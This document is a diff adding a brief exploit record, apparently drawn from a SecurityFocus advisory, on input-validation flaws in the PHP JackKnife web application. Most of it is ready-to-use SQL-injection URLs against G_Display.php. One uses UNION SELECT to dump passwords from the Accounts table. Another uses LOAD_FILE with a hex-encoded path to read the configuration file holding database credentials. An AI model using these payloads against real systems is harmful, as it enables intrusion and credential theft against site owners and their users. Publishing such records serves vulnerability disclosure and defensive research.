@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/24253/info
+
+PHP JackKnife is prone to multiple input-validation vulnerabilities, including cross-site scripting and SQL-injection issues.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+http://www.example.com/PHPJK/G_Display.php?iCategoryUnq=-1/**/union/**/select/**/1,2,Password,4,5,6/**/from/**/Accounts/*
+Read database credentials:
+http://www.example.com/PHPJK/G_Display.php?iCategoryUnq=-1/**/union/**/select/**/1,2,LOAD_FILE(0x2F7573722F6C6F63616C2F617061636865322F6874646F63732F5048504A4B2F436F6E66696
+775726174696F6E732F5048504A4B5F436F6E6669672E706870),4,5,6/**/from/**/Accounts/*
